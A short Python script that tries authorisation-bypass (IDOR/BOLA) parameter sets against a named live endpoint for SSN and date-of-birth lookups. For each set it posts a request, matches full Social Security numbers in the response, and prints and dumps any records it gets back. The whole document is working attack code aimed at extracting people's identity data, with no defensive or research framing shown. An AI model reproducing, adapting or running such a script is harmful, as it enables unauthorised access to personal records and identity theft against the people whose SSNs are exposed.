def test_idor_bypass(session):
    base_data = {'csrfmiddlewaretoken': CSRF_TOKEN, 'firstname': 'John', 'st': 'CA'}
    
    # Common BOLA vectors
    vectors = [
        {'user_id': '1', 'account_id': '1'},  # Admin override
        {'preview': 'true', 'demo': '1'},     # Demo mode
        {'api_key': '', 'auth': 'null'},      # API bypass
        {'bypass': 'true', 'test': '1'},      # Debug flags
    ]
    
    for vec in vectors:
        data = {**base_data, **vec}
        resp = session.post('https://usfull.info/service/get_ssndob/', data=data, timeout=10)
        if re.search(r'\d{3}-\d{2}-\d{4}', resp.text):  # Full SSN pattern
            print(f"✅ BOLA hit: {vec}")
            print(resp.text[:500])  # Dump results

test_idor_bypass(session)